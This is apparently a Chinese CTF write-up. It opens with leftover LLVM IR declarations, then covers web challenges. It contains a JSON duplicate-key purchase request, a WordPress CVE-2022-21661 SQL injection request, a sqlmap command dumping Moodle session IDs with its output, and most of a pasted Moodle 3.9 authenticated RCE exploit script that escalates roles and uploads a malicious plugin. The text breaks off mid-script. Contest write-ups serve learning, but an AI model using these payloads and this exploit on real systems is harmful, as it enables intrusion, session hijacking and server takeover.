declare dso_local void @b86cc9qf(i32) #1


declare dso_local void @b87cc9qf(i32) #1


declare dso_local void @b88cc9qf(i32) #1


declare dso_local void @b89cc9qf(i32) #1


declare dso_local void @b90cc9qf(i32) #1


declare dso_local void @b91cc9qf(i32) #1


declare dso_local void @b92cc9qf(i32) #1


declare dso_local void @b93cc9qf(i32) #1


declare dso_local void @b94cc9qf(i32) #1


declare dso_local void @b95cc9qf(i32) #1


declare dso_local void @b96cc9qf(i32) #1


declare dso_local void @b97cc9qf(i32) #1


declare dso_local void @b98cc9qf(i32) #1


declare dso_local void @b99cc9qf(i32) #1


declare dso_local void @c1cc9qf(i32) #1


declare dso_local void @c2cc9qf(i32) #1


declare dso_local void @c3cc9qf(i32) #1


declare dso_local void @c4cc9qf(i32) #1


declare dso_local void @c5cc9qf(i32) #1


declare dso_local void @c6cc9qf(i32) #1


declare dso_local void @c7cc9qf(i32) #1


declare dso_local void @c8cc9qf(i32) #1


declare dso_local void @c9cc9qf(i32) #1


declare dso_local void @c10cc9qf(i32) #1


declare dso_local void @c11cc9qf(i32) #1


declare dso_local void @c12cc9qf(i32) #1


declare dso_local void @c13cc9qf(i32) #1


declare dso_local void @c14cc9qf(i32) #1


declare dso_local void @c15cc9qf(i32) #1


declare dso_local void @c16cc9qf(i32) #1


declare dso_local void @c17cc9qf(i32) #1


declare dso_local void @c18cc9qf(i32) #1


declare dso_local void @c19cc9qf(i32) #1


declare dso_local void @c20cc9qf(i32) #1


declare dso_local void @c21cc9qf(i32) #1


declare dso_local void @c22cc9qf(i32) #1


declare dso_local void @c23cc9qf(i32) #1


declare dso_local void @c24cc9qf(i32) #1


declare dso_local void @c25cc9qf(i32) #1


declare dso_local void @c26cc9qf(i32) #1


declare dso_local void @c27cc9qf(i32) #1


declare dso_local void @c28cc9qf(i32) #1


declare dso_local void @c29cc9qf(i32) #1


declare dso_local void @c30cc9qf(i32) #1


declare dso_local void @c31cc9qf(i32) #1


declare dso_local void @c32cc9qf(i32) #1


declare dso_local void @c33cc9qf(i32) #1


declare dso_local void @c34cc9qf(i32) #1


declare dso_local void @c35cc9qf(i32) #1


declare dso_local void @c36cc9qf(i32) #1


declare dso_local void @c37cc9qf(i32) #1


declare dso_local void @c38cc9qf(i32) #1


declare dso_local void @c39cc9qf(i32) #1


declare dso_local void @c40cc9qf(i32) #1


declare dso_local void @c41cc9qf(i32) #1


declare dso_local void @c42cc9qf(i32) #1


declare dso_local void @c43cc9qf(i32) #1


declare dso_local void @c44cc9qf(i32) #1


declare dso_local void @c45cc9qf(i32) #1


declare dso_local void @c46cc9qf(i32) #1


declare dso_local void @c47cc9qf(i32) #1


declare dso_local void @c48cc9qf(i32) #1


declare dso_local void @c49cc9qf(i32) #1


declare dso_local void @c50cc9qf(i32) #1


declare dso_local void @c51cc9qf(i32) #1


declare dso_local void @c52cc9qf(i32) #1


declare dso_local void @c53cc9qf(i32) #1


declare dso_local void @c54cc9qf(i32) #1


declare dso_local void @c55cc9qf(i32) #1


declare dso_local void @c56cc9qf(i32) #1


declare dso_local void @c57cc9qf(i32) #1


declare dso_local void @c58cc9qf(i32) #1


declare dso_local void @c59cc9qf(i32) #1


declare dso_local void @c60cc9qf(i32) #1


declare dso_local void @tiandongwanxiang(...) #1


declare dso_local void @fight(i64) #1


attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }


!llvm.module.flags = !{!0}
!llvm.ident = !{!1}


!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 8.0.1-9 (tags/RELEASE_801/final)"}
```



​                 ![img](https://docimg2.docs.qq.com/image/M3KWbPYkRDcTsS_1bhybwA.png?w=1064&h=315)        





# **web**



## web1 

http://182.92.222.142:33056/mainx

xss=>admin=>json

拿到源码：/static/qwb_source_12580.zip

参考链接： https://bishopfox.com/blog/json-interoperability-vulnerabilities

```
POST /buy HTTP/1.1
Host: 47.93.187.169:22503
Content-Length: 60
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://47.93.187.169:22503
Referer: http://47.93.187.169:22503/main
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.YuSlIA.OBsf44KtRgwpJoBTIA5QKJ2-TrM
Connection: close


{"product":[{"id":1,"num":0},{"id":2,
"num":-1,
"num":1}]}
```



##  easylogin



```
47.105.52.19
47.105.60.229
47.104.251.7
本题目为渗透题，开放了80和8888两个端口，其余端口均和本题目无关，本题目无需进行目录扫描和爆破
(题目每10分钟都会自动恢复初始环境，如果遇到环境不对，请稍等片刻或联系群管寻找出题人，flag位置在常用文件夹下，并非国际通用位置，可以通过创建时间来推断，需要稍微寻找一下)
```

wordpress感觉一般都是后台弱密码（



```
用户名
adminadminadminaaaaa
或许可以爆破进后台看
```



```
WordPress version 5.8.2
https://www.exploit-db.com/exploits/50663 -- CVE-2022-21661
制作一个字典枚举一下常见的action？
这个漏洞和action是关联的，action是和插件函数关联的


https://cn-sec.com/archives/1206142.html
https://kiksecurity.com/blog/sql-injection-in-wordpress-core-cve-2022-21661/
```

sqli

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: 47.105.60.229
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://47.105.60.229/index.php/2022/07/30/hello-world/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wordpress_test_cookie=WP%20Cookie%20check
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 183


action=aa&query_vars[tax_query][1][include_children]=1&query_vars[tax_query][1][terms][1]=1) or updatexml(0x7e,concat(1,user()),0x7e)#&query_vars[tax_query][1][field]=term_taxonomy_id
```



```
获取moodle 的 session


python sqlmap.py -r ~/opt/sql1.txt --technique=E -D moodle -T mdl_sessions -C sid --dump
```

```
+----------------------------+
| sid                        |
+----------------------------+
| 0uqdokt4h98h0hnlh5mgfq1qu3 |
| 1v4a1u1tlqt6vbd4srgpsre3jj |
| 5c7pu3sgld9fpuek1s6jskbst5 |
| 5oalvurb41tqr1kfvo9pjmj3hh |
| 9cmjvig31ok7tbnm0pj9liqv06 |
| al418nm1r4jt1f3c7dsf1lq15r |
| ale3e6u7r75eq4a0jo1e1afe3c |
| b4v70ng39s4egudu4uq1rl7k8s |
| k2ah9nt088tkefv7dttt3rg7hc |
| keapgbtotrvj5bkjmh3d0jl6gm |
| mo4rpgoubt3d5n92q0iid88qgg |
| nutp0e9pbgd7olcdb3gsr1egj2 |
| qduoaeo6qq69kmj0sri0llsldk |
| r0afvpome4o2ni4mi087ta7esf |
| r70r2c4r652fr09n3orceki7r9 |
| sj395bpm3hm23u9id5mif51smj |
+----------------------------+
```



后面的那一步利用已有session直接RCE



```
# Exploit Title: Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 12-05-2021
# Exploit Author: lanz
# Vendor Homepage: https://moodle.org/
# Version: Moodle 3.9
# Tested on: FreeBSD


#!/usr/bin/python3


## Moodle 3.9 - RCE (Authenticated as teacher)
## Based on PoC and Payload to assign full permissions to manager rol:
##   * https://github.com/HoangKien1020/CVE-2020-14321


## Repository: https://github.com/lanzt/CVE-2020-14321/blob/main/CVE-2020-14321_RCE.py


import string, random
import requests, re
import argparse
import base64
import signal
import time
from pwn import *


class Color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'


def def_handler(sig, frame):
    print(Color.RED + "\n[!] 3xIt1ngG...\n")
    exit(1)


signal.signal(signal.SIGINT, def_handler)


banner = base64.b64decode("IF9fICAgICBfXyAgICAgX18gICBfXyAgX18gICBfXyAgICAgICAgICAgICAgX18gIF9fICAgICAKLyAgXCAgL3xfICBfXyAgIF8pIC8gIFwgIF8pIC8gIFwgX18gIC98IHxfX3wgIF8pICBfKSAvfCAKXF9fIFwvIHxfXyAgICAgL19fIFxfXy8gL19fIFxfXy8gICAgICB8ICAgIHwgX18pIC9fXyAgfCDigKIgYnkgbGFuegoKTW9vZGxlIDMuOSAtIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiAoQXV0aGVudGljYXRlZCBhcyB0ZWFjaGVyKQpDb3Vyc2UgZW5yb2xtZW50cyBhbGxvd2VkIHByaXZpbGVnZSBlc2NhbGF0aW9uIGZyb20gdGVhY2hlciByb2xlIGludG8gbWFuYWdlciByb2xlIHRvIFJDRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==").decode()


print(Color.BLUE + banner + Color.END)


def usagemybro():
    fNombre = os.path.basename(__file__)
    ussage = fNombre + ' [-h] [-u USERNAME] [-p PASSWORD] [-idm ID_MANAGER] [-idc ID_COURSE] [-c COMMAND] [--cookie TEACHER_COOKIE] url\n\n'
    ussage += '[+] Examples:\n'
    ussage += '\t' + fNombre + ' http://moodle.site.com/moodle -u teacher_name -p teacher_pass\n'
    ussage += '\t' + fNombre + " http://moodle.site.com/moodle --cookie thisistheffcookieofmyteaaacher\n"
    return ussage


def arguments():
    parse = argparse.ArgumentParser(usage=usagemybro())
    parse.add_argument(dest='url', type=str, help='URL Moodle site')
    parse.add_argument('-u', dest='username', type=str, default='lanz', help='Teacher username, default: lanz')
    parse.add_argument('-p', dest='password', type=str, default='Lanz123$!', help='Teacher password, default: Lanz123$!')
    parse.add_argument('-idm', dest='id_manager', type=str, default='25', help='Manager user ID, default: 25')
    parse.add_argument('-idc', dest='id_course', type=str, default='5', help='Course ID valid to enrol yourself, default: 5')
    parse.add_argument('-c', dest='command', type=str, default='whoami', help='Command to execute, default: whoami')
    parse.add_argument('--cookie', dest='teacher_cookie', type=str, default='', help='Teacher cookie (if you don\'t have valid credentials)')
    return parse.parse_args()


def login(url, username, password, course_id, teacher_cookie):
    '''
    Sign in on site, with creds or with cookie
    '''


    p1 = log.progress("Login on site")


    session = requests.Session()
    r = session.get(url + '/login/index.php')


    # Sign in with teacher cookie
    if teacher_cookie != "":
        p1.status("Cookie " + Color.BLUE + "MoodleSession:" + teacher_cookie + Color.END)
        time.sleep(2)


        # In case the URL format is: http://moodle.site.com/moodle
        cookie_domain = url.split('/')[2] # moodle.site.com
        cookie_path = "/%s/" % (url.split('/')[3]) # /moodle/
        session.cookies.set('MoodleSession', teacher_cookie, domain=cookie_domain, path=cookie_path)


        r = session.get(url + '/user/index.php', params={"id":course_id})
        try:
            re.findall(r'class="usertext mr-1">(.*?)<', r.text)[0]
        except IndexError:
            p1.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n")
            exit(1)


        id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
        sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]


        p1.success(Color.BLUE + "MoodleSession:" + teacher_cookie + Color.END + Color.YELLOW +  " ✓" + Color.END)
        time.sleep(1)


    # Sign in with teacher credentials
    elif username and password != "":
        p1.status("Creds " + Color.BLUE + username + ":" + password + Color.END)
        time.sleep(2)


        login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]


        data_post = {
            "anchor" : "",
            "logintoken" : login_token,
            "username" : username,
            "password" : password
        }
        
        r = session.post(url + '/login/index.php', data=data_post)
        if "Recently accessed courses" not in r.text:
            p1.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nInvalid credentials.\n")
            exit(1)


        id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
        sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]


        p1.success(Color.BLUE + username + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
        time.sleep(1)


    else:
        print(Color.RED + "\nUse valid credentials or valid cookie\n")
        exit(1)


    return session, id_user, sess_key


def enrol2rce(session, url, id_manager, username, course_id, teacher_cookie, command):
    '''
    Assign rol manager to teacher and manager account in the course.
    '''


    p4 = log.progress("Updating roles to move on manager accout")
    time.sleep(1)


    r = session.get(url + '/user/index.php', params={"id":course_id})
    try:
        teacher_user = re.findall(r'class="usertext mr-1">(.*?)<', r.text)[0]
    except IndexError:
        p4.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n")
        exit(1)


    p4.status("Teacher " + Color.BLUE + teacher_user + Color.END)
    time.sleep(1)


    id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]


    session = update_rol(session, url, sess_key, course_id, id_user)
    session = update_rol(session, url, sess_key, course_id, id_manager)


    data_get = {
        "id" : course_id,
        "user" : id_manager,
        "sesskey" : sess_key
    }


    r = session.get(url + '/course/loginas.php', params=data_get)
    if "You are logged in as" not in r.text:
        p4.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError trying to move on manager account. Validate credentials (or cookie).\n")
        exit(1)


    p4.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)


    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]


    # Updating rol manager to enable install plugins
    session, sess_key = update_rol_manager(session, url, sess_key)


    # Upload malicious zip file
    zipb64_up(session, url, sess_key, teacher_user, course_id)


    # RCE on system
    moodle_RCE(url, command)


def update_rol(session, url, sess_key, course_id, id_user):
    '''
    Updating teacher rol to enable he update other users
    '''


    data_get = {
        "mform_showmore_main" : "0",
        "id" : course_id,
        "action" : "enrol",
        "enrolid" : "10",
        "sesskey" : sess_key,
        "_qf__enrol_manual_enrol_users_form" : "1",
        "mform_showmore_id_main" : "0", 
        "userlist[]" : id_user, 
        "roletoassign" : "1",
        "startdate" : "4",
        "duration" : ""
    }


    r = session.get(url + '/enrol/manual/ajax.php', params=data_get)
    return session


def update_rol_manager(session, url, sess_key):
    '''
    Updating rol manager to enable install plugins
        * Extracted from: https://github.com/HoangKien1020/CVE-2020-14321
    '''


    p6 = log.progress("Updating rol manager to enable install plugins")
    time.sleep(1)


    data_get = {
        "action":"edit",
        "roleid":"1"
    }


    random_desc = ''.join(random.choice(string.ascii_lowercase) for i in range(15))


    # Headache part :P
    data_post = [('sesskey',sess_key),('return','manage'),('resettype','none'),('shortname','manager'),('name',''),('description',random_desc),('archetype','manager'),('contextlevel10','0'),('contextlevel10','1'),('contextlevel30','0'),('contextlevel30','1'),('contextlevel40','0'),('contextlevel40','1'),('contextlevel50','0'),('contextlevel50','1'),('contextlevel70','0'),('contextlevel70','1'),('contextlevel80','0'),('contextlevel80','1'),('allowassign[]',''),('allowassign[]','1'),('allowassign[]','2'),('allowassign[]','3'),('allowassign[]','4'),('allowassign[]','5'),('allowassign[]','6'),('allowassign[]','7'),('allowassign[]','8'),('allowoverride[]',''),('allowoverride[]','1'),('allowoverride[]','2'),('allowoverride[]','3'),('allowoverride[]','4'),('allowoverride[]','5'),('allowoverride[]','6'),('allowoverride[]','7'),('allowoverride[]','8'),('allowswitch[]',''),('allowswitch[]','1'),('allowswitch[]','2'),('allowswitch[]','3'),('allowswitch[]','4'),('allowswitch[]','5'),('allowswitch[]','6'),('allowswitch[]','7'),('allowswitch[]','8'),('allowview[]',''),('allowview[]','1'),('allowview[]','2'),('allowview[]','3'),('allowview[]','4'),('allowview[]','5'),('allowview[]','6'),('allowview[]','7'),('allowview[]','8'),('block/admin_bookmarks:myaddinstance','1'),('block/badges:myaddinstance','1'),('block/calendar_month:myaddinstance','1'),('block/calendar_upcoming:myaddinstance','1'),('block/comments:myaddinstance','1'),('block/course_list:myaddinstance','1'),('block/globalsearch:myaddinstance','1'),('block/glossary_random:myaddinstance','1'),('block/html:myaddinstance','1'),('block/lp:addinstance','1'),('block/lp:myaddinstance','1'),('block/mentees:myaddinstance','1'),('block/mnet_hosts:myaddinstance','1'),('block/myoverview:myaddinstance','1'),('block/myprofile:myaddinstance','1'),('block/navigation:myaddinstance','1'),('block/news_items:myaddinstance','1'),('block/online_users:myaddinstance','1'),('block/private_files:myaddinstance','1'),('block/recentlyaccessedcourses:myaddinstance','1'),('block/recentlyaccesseditems:myaddinstance','1'),('block/rss_client:myaddinstance','1'),('block/settings:myaddinstance','1'),('block/starredcourses:myaddinstance','1'),('block/tags:myaddinstance','1'),('block/timeline:myaddinstance','1'),('enrol/category:synchronised','1'),('message/airnotifier:managedevice','1'),('moodle/analytics:listowninsights','1'),('moodle/analytics:managemodels','1'),('moodle/badges:manageglobalsettings','1'),('moodle/blog:create','1'),('moodle/blog:manageentries','1'),('moodle/blog:manageexternal','1'),('moodle/blog:search','1'),('moodle/blog:view','1'),('moodle/blog:viewdrafts','1'),('moodle/course:configurecustomfields','1'),('moodle/course:recommendactivity','1'),('moodle/grade:managesharedforms','1'),('moodle/grade:sharegradingforms','1'),('moodle/my:configsyspages','1'),('moodle/my:manageblocks','1'),('moodle/portfolio:export','1'),('moodle/question:config','1'),('moodle/restore:createuser','1'),('moodle/role:manage','1'),('moodle/search:query','1'),('moodle/site:config','1'),('moodle/site:configview','1'),('moodle/site:deleteanymessage','1'),('moodle/site:deleteownmessage','1'),('moodle/site:doclinks','1'),('moodle/site:forcelanguage','1'),('moodle/site:maintenanceaccess','1'),('moodle/site:manageallmessaging','1'),('moodle/site:messageanyuser','1'),('moodle/site:mnetlogintoremote','1'),('moodle/site:readallmessages','1'),('moodle/site:sendmessage','1'),('moodle/site:uploadusers','1'),('moodle/site:viewparticipants','1'),('moodle/tag:edit','1'),('moodle/tag:editblocks','1'),('moodle/tag:flag','1'),('moodle/tag:manage','1'),('moodle/user:changeownpassword','1'),('moodle/user:create','1'),('moodle/user:delete','1'),('moodle/user:editownmessageprofile','1'),('moodle/user:editownprofile','1'),('moodle/user:ignoreuserquota','1'),('moodle/user:manageownblocks','1'),('moodle/user:manageownfiles','1'),('moodle/user:managesyspages','1'),('moodle/user:update','1'),('moodle/webservice:createmobiletoken','1'),('moodle/webservice:createtoken','1'),('moodle/webservice:managealltokens','1'),('quizaccess/seb:managetemplates','1'),('report/courseoverview:view','1'),('report/performance:view','1'),('report/questioninstances:view','1'),('report/security:view','1'),('report/status:view','1'),('tool/customlang:edit','1'),('tool/customlang:view','1'),('tool/dataprivacy:managedataregistry','1'),('tool/dataprivacy:managedatarequests','1'),('tool/dataprivacy:requestdeleteforotheruser','1'),('tool/lpmigrate:frameworksmigrate','1'),('tool/monitor:managetool','1'),('tool/policy:accept','1'),('tool/policy:managedocs','1'),('tool/policy:viewacceptances','1'),('tool/uploaduser:uploaduserpictures','1'),('tool/usertours:managetours','1'),('auth/oauth2:managelinkedlogins','1'),('moodle/badges:manageownbadges','1'),('moodle/badges:viewotherbadges','1'),('moodle/competency:evidencedelete','1'),('moodle/competency:plancomment','1'),('moodle/competency:plancommentown','1'),('moodle/competency:planmanage','1'),('moodle/competency:planmanagedraft','1'),('moodle/competency:planmanageown','1'),('moodle/competency:planmanageowndraft','1'),('moodle/competency:planrequestreview','1'),('moodle/competency:planrequestreviewown','1'),('moodle/competency:planreview','1'),('moodle/competency:planview','1'),('moodle/competency:planviewdraft','1'),('moodle/competency:planviewown','1'),('moodle/competency:planviewowndraft','1'),('moodle/competency:usercompetencycomment','1'),('moodle/competency:usercompetencycommentown','1'),('moodle/competency:usercompetencyrequestreview','1'),('moodle/competency:usercompetencyrequestreviewown','1'),('moodle/competency:usercompetencyreview','1'),('moodle/competency:usercompetencyview','1'),('moodle/competency:userevidencemanage','1'),('moodle/competency:userevidencemanageown','0'),('moodle/competency:userevidenceview','1'),('moodle/user:editmessageprofile','1'),('moodle/user:editprofile','1'),('moodle/user:manageblocks','1'),('moodle/user:readuserblogs','1'),('moodle/user:readuserposts','1'),('moodle/user:viewalldetails','1'),('moodle/user:viewlastip','1'),('moodle/user:viewuseractivitiesreport','1'),('report/usersessions:manageownsessions','1'),('tool/dataprivacy:downloadallrequests','1'),('tool/dataprivacy:downloadownrequest','1'),('tool/dataprivacy:makedatadeletionrequestsforchildren','1'),('tool/dataprivacy:makedatarequestsforchildren','1'),('tool/dataprivacy:requestdelete','1'),('tool/policy:acceptbehalf','1'),('moodle/category:manage','1'),('moodle/category:viewcourselist','1'),('moodle/category:viewhiddencategories','1'),('moodle/cohort:assign','1'),('moodle/cohort:manage','1'),('moodle/competency:competencymanage','1'),('moodle/competency:competencyview','1'),('moodle/competency:templatemanage','1'),('moodle/competency:templateview','1'),('moodle/course:create','1'),('moodle/course:request','1'),('moodle/site:approvecourse','1'),('repository/contentbank:accesscoursecategorycontent','1'),('repository/contentbank:accessgeneralcontent','1'),('block/recent_activity:viewaddupdatemodule','1'),('block/recent_activity:viewdeletemodule','1'),('contenttype/h5p:access','1'),('contenttype/h5p:upload','1'),('contenttype/h5p:useeditor','1'),('enrol/category:config','1'),('enrol/cohort:config','1'),('enrol/cohort:unenrol','1'),('enrol/database:config','1'),('enrol/database:unenrol','1'),('enrol/flatfile:manage','1'),('enrol/flatfile:unenrol','1'),('enrol/guest:config','1'),('enrol/imsenterprise:config','1'),('enrol/ldap:manage','1'),('enrol/lti:config','1'),('enrol/lti:unenrol','1'),('enrol/manual:config','1'),('enrol/manual:enrol','1'),('enrol/manual:manage','1'),('enrol/manual:unenrol','1'),('enrol/manual:unenrolself','1'),('enrol/meta:config','1'),('enrol/meta:selectaslinked','1'),('enrol/meta:unenrol','1'),('enrol/mnet:config','1'),('enrol/paypal:config','1'),('enrol/paypal:manage','1'),('enrol/paypal:unenrol','1'),('enrol/paypal:unenrolself','1'),('enrol/self:config','1'),('enrol/self:holdkey','1'),('enrol/self:manage','1'),('enrol/self:unenrol','1'),('enrol/self:unenrolself','1'),('gradeexport/ods:publish','1'),('gradeexport/ods:view','1'),('gradeexport/txt:publish','1'),('gradeexport/txt:view','1'),('gradeexport/xls:publish','1'),('gradeexport/xls:view','1'),('gradeexport/xml:publish','1'),('gradeexport/xml:view','1'),('gradeimport/csv:view','1'),('gradeimport/direct:view','1'),('gradeimport/xml:publish','1'),('gradeimport/xml:view','1'),('gradereport/grader:view','1'),('gradereport/history:view','1'),('gradereport/outcomes:view','1'),('gradereport/overview:view','1'),('gradereport/singleview:view','1'),('gradereport/user:view','1'),('mod/assign:addinstance','1'),('mod/assignment:addinstance','1'),('mod/book:addinstance','1'),('mod/chat:addinstance','1'),('mod/choice:addinstance','1'),('mod/data:addinstance','1'),('mod/feedback:addinstance','1'),('mod/folder:addinstance','1'),('mod/forum:addinstance','1'),('mod/glossary:addinstance','1'),('mod/h5pactivity:addinstance','1'),('mod/imscp:addinstance','1'),('mod/label:addinstance','1'),('mod/lesson:addinstance','1'),('mod/lti:addcoursetool','1'),('mod/lti:addinstance','1'),('mod/lti:addmanualinstance','1'),('mod/lti:addpreconfiguredinstance','1'),('mod/lti:requesttooladd','1'),('mod/page:addinstance','1'),('mod/quiz:addinstance','1'),('mod/resource:addinstance','1'),('mod/scorm:addinstance','1'),('mod/survey:addinstance','1'),('mod/url:addinstance','1'),('mod/wiki:addinstance','1'),('mod/workshop:addinstance','1'),('moodle/analytics:listinsights','1'),('moodle/backup:anonymise','1'),('moodle/backup:backupcourse','1'),('moodle/backup:backupsection','1'),('moodle/backup:backuptargetimport','1'),('moodle/backup:configure','1'),('moodle/backup:downloadfile','1'),('moodle/backup:userinfo','1'),('moodle/badges:awardbadge','1'),('moodle/badges:configurecriteria','1'),('moodle/badges:configuredetails','1'),('moodle/badges:configuremessages','1'),('moodle/badges:createbadge','1'),('moodle/badges:deletebadge','1'),('moodle/badges:earnbadge','1'),('moodle/badges:revokebadge','1'),('moodle/badges:viewawarded','1'),('moodle/badges:viewbadges','1'),('moodle/calendar:manageentries','1'),('moodle/calendar:managegroupentries','1'),('moodle/calendar:manageownentries','1'),('moodle/cohort:view','1'),('moodle/comment:delete','1'),('moodle/comment:post','1'),('moodle/comment:view','1'),('moodle/competency:competencygrade','1'),('moodle/competency:coursecompetencygradable','1'),('moodle/competency:coursecompetencymanage','1'),('moodle/competency:coursecompetencyview','1'),('moodle/contentbank:access','1'),('moodle/contentbank:deleteanycontent','1'),('moodle/contentbank:deleteowncontent','1'),('moodle/contentbank:manageanycontent','1'),('moodle/contentbank:manageowncontent','1'),('moodle/contentbank:upload','1'),('moodle/contentbank:useeditor','1'),('moodle/course:bulkmessaging','1'),('moodle/course:changecategory','1'),('moodle/course:changefullname','1'),('moodle/course:changeidnumber','1'),('moodle/course:changelockedcustomfields','1'),('moodle/course:changeshortname','1'),('moodle/course:changesummary','1'),('moodle/course:creategroupconversations','1'),('moodle/course:delete','1'),('moodle/course:enrolconfig','1'),('moodle/course:enrolreview','1'),('moodle/course:ignorefilesizelimits','1'),('moodle/course:isincompletionreports','1'),('moodle/course:managefiles','1'),('moodle/course:managegroups','1'),('moodle/course:managescales','1'),('moodle/course:markcomplete','1'),('moodle/course:movesections','1'),('moodle/course:overridecompletion','1'),('moodle/course:renameroles','1'),('moodle/course:reset','1'),('moodle/course:reviewotherusers','1'),('moodle/course:sectionvisibility','1'),('moodle/course:setcurrentsection','1'),('moodle/course:setforcedlanguage','1'),('moodle/course:tag','1'),('moodle/course:update','1'),('moodle/course:useremail','1'),('moodle/course:view','1'),('moodle/course:viewhiddencourses','1'),('moodle/course:viewhiddensections','1'),('moodle/course:viewhiddenuserfields','1'),('moodle/course:viewparticipants','1'),('moodle/course:viewscales','1'),('moodle/course:viewsuspendedusers','1'),('moodle/course:visibility','1'),('moodle/filter:manage','1'),('moodle/grade:edit','1'),('moodle/grade:export','1'),('moodle/grade:hide','1'),('moodle/grade:import','1'),('moodle/grade:lock','1'),('moodle/grade:manage','1'),('moodle/grade:managegradingforms','1'),('moodle/grade:manageletters','1'),('moodle/grade:manageoutcomes','1'),('moodle/grade:unlock','1'),('moodle/grade:view','1'),('moodle/grade:viewall','1'),('moodle/grade:viewhidden','1'),('moodle/notes:manage','1'),('moodle/notes:view','1'),('moodle/question:add','1'),('moodle/question:editall','1'),('moodle/question:editmine','1'),('moodle/question:flag','1'),('moodle/question:managecategory','1'),('moodle/question:moveall','1'),('moodle/question:movemine','1'),('moodle/question:tagall','1'),('moodle/question:tagmine','1'),('moodle/question:useall','1'),('moodle/question:usemine','1'),('moodle/question:viewall','1'),('moodle/question:viewmine','1'),('moodle/rating:rate','1'),('moodle/rating:view','1'),('moodle/rating:viewall','1'),('moodle/rating:viewany','1'),('moodle/restore:configure','1'),('moodle/restore:restoreactivity','1'),('moodle/restore:restorecourse','1'),('moodle/restore:restoresection','1'),('moodle/restore:restoretargetimport','1'),('moodle/restore:rolldates','1'),('moodle/restore:uploadfile','1'),('moodle/restore:userinfo','1'),('moodle/restore:viewautomatedfilearea','1'),('moodle/role:assign','1'),('moodle/role:override','1'),('moodle/role:review','1'),('moodle/role:safeoverride','1'),('moodle/role:switchroles','1'),('moodle/site:viewreports','1'),('moodle/user:loginas','1'),('moodle/user:viewdetails','1'),('moodle/user:viewhiddendetails','1'),('report/completion:view','1'),('report/log:view','1'),('report/log:viewtoday','1'),('report/loglive:view','1'),('report/outline:view','1'),('report/outline:viewuserreport','1'),('report/participation:view','1'),('report/progress:view','1'),('report/stats:view','1'),('repository/contentbank:accesscoursecontent','1'),('tool/monitor:managerules','1'),('tool/monitor:subscribe','1'),('tool/recyclebin:deleteitems','1'),('tool/recyclebin:restoreitems','1'),('tool/recyclebin:viewitems','1'),('webservice/rest:use','1'),('webservice/soap:use','1'),('webservice/xmlrpc:use','1'),('atto/h5p:addembed','1'),('atto/recordrtc:recordaudio','1'),('atto/recordrtc:recordvideo','1'),('booktool/exportimscp:export','1'),('booktool/importhtml:import','1'),('booktool/print:print','1'),('forumreport/summary:view','1'),('forumreport/summary:viewall','1'),('mod/assign:editothersubmission','1'),('mod/assign:exportownsubmission','1'),('mod/assign:grade','1'),('mod/assign:grantextension','1'),('mod/assign:manageallocations','1'),('mod/assign:managegrades','1'),('mod/assign:manageoverrides','1'),('mod/assign:receivegradernotifications','1'),('mod/assign:releasegrades','1'),('mod/assign:revealidentities','1'),('mod/assign:reviewgrades','1'),('mod/assign:showhiddengrader','1'),('mod/assign:submit','1'),('mod/assign:view','1'),('mod/assign:viewblinddetails','1'),('mod/assign:viewgrades','1'),('mod/assignment:exportownsubmission','1'),('mod/assignment:grade','1'),('m